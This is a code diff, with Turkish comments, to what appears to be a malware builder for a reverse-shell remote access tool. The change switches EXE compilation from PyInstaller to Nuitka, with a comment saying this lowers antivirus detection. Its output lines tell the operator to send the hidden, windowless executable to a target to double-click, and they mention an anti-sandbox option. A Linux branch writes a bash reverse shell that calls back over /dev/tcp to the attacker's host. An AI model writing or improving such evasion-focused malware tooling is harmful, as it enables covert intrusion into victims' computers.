@@ -394,25 +394,27 @@ exec(_c)
 """
         save_text(stub_path, stub_code)
 
-        print(f"{C.YELLOW}  [*] PyInstaller ile EXE derleniyor (bu biraz sürebilir)...{C.RESET}")
+        print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu biraz sürebilir)...{C.RESET}")
 
-        # PyInstaller ile derle
+        # Nuitka ile derle (native C — AV tespiti çok düşük)
         exe_out = os.path.join(output_dir, exe_name + ".exe")
         result = subprocess.run(
-            [sys.executable, "-m", "PyInstaller",
-             "--onefile", "--noconsole", "--clean",
-             "--distpath", output_dir,
-             "--workpath", os.path.join(output_dir, "_build"),
-             "--specpath", os.path.join(output_dir, "_build"),
-             "--name", exe_name,
+            [sys.executable, "-m", "nuitka",
+             "--onefile", "--windows-console-mode=disable",
+             "--mingw64",
+             "--output-dir=" + output_dir,
+             "--output-filename=" + exe_name + ".exe",
+             "--remove-output",
+             "--assume-yes-for-downloads",
              stub_path],
             capture_output=True, text=True
         )
 
         # Temizlik
         for cleanup in [stub_path,
-                        os.path.join(output_dir, "_build"),
-                        os.path.join(output_dir, f"{exe_name}.spec") if os.path.exists(os.path.join(output_dir, f"{exe_name}.spec")) else None]:
+                        os.path.join(output_dir, "_stub.build"),
+                        os.path.join(output_dir, "_stub.onefile-build"),
+                        os.path.join(output_dir, "_stub.dist")]:
             if cleanup and os.path.exists(cleanup):
                 try:
                     if os.path.isdir(cleanup):
@@ -431,6 +433,7 @@ exec(_c)
             print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
             print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
             print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
+            print(f"{C.WHITE}  🔧 Derleyici: Nuitka (Native C){C.RESET}")
             print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
             print(f"{C.YELLOW}  [!] Pencere açılmaz, arka planda sessizce çalışır.{C.RESET}")
             print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
@@ -442,7 +445,9 @@ exec(_c)
             print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
             if result.stderr:
                 print(f"{C.RED}  [-] Hata: {result.stderr[:500]}{C.RESET}")
-            print(f"{C.YELLOW}  [!] PyInstaller kurulu mu? 'pip install pyinstaller' ile kurun.{C.RESET}")
+            if result.stdout:
+                print(f"{C.DIM}  {result.stdout[-500:]}{C.RESET}")
+            print(f"{C.YELLOW}  [!] Nuitka kurulu mu? 'pip install nuitka' ile kurun.{C.RESET}")
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
